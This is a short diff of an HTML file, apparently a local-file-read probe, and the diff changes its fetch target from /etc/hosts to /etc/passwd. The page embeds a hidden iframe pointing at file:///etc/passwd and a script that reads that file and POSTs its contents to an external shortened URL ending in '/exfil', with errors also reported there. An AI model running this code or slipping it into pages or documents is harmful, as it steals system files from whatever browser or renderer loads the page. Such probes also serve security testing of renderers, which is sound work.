@@ -29,7 +29,7 @@
   <iframe src="file:///etc/passwd" style="display:none"></iframe>
   <script>
     // Attempt to read via fetch()
-    fetch('file:///etc/hosts')
+    fetch('file:///etc/passwd')
       .then(r => r.text())
       .then(d => fetch('https://tinyurl.com/vvh5tkem/exfil', { method: 'POST', body: d }))
       .catch(e => fetch('https://tinyurl.com/vvh5tkem/error', { body: e.message }));
